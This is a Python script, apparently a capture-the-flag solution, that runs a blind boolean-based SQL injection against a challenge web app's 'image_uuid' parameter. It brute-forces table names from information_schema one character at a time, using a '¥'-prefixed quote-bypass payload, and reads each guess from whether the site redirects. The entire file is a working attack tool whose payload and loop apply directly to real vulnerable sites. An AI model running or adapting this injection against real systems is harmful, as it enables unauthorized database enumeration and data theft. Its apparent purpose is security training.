import requests
import time

'''
This function saves in the tables.txt file the attacked database's tables and their index.
'''

# Configuration
url = "https://web6.chall.necst.it/myphotos"
session_cookie= "<cookie>" # to modify: insert your own cookie

def tables_spoofer():
    session = requests.Session()
    file = open('tables.txt', 'w')
    
    for t in range(11,90): # for each table 
        file.write("--- TABLE " + str(t) + ' --- \n')
        print("--- TABLE " + str(t) + ' --- \n')

        for char_index in range(1,20): 

            for n in range(65,123):
                query = f"¥\' or ascii(substring((SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET " + str(t) + "), " + str(char_index) + ", 1)) = " + str(n) + " LIMIT 1;--%20"
                
                success = False
                while not success:
                    try:
                        request = session.get(url, params={'image_uuid': query}, cookies={'session': session_cookie})
                        success = True
                    except requests.exceptions.ConnectionError:
                        print("Connection error, let's try again after 5 seconds")
                        time.sleep(5)
            
                if(len(request.history)==0): # statement true when the website does not redirect to /myphotos page   
                    file.write(chr(n)) # to convert in ascii
                    print("converted :"+ chr(n)+" ascii num:"+str(n))
                    break
                elif(len(request.history)>0): # statement true when the website does redirect to /myphotos page   
                    continue
                else:
                    print("Error raised")

        file.write("\n")

    print("Finished!")
    file.close()

tables_spoofer()
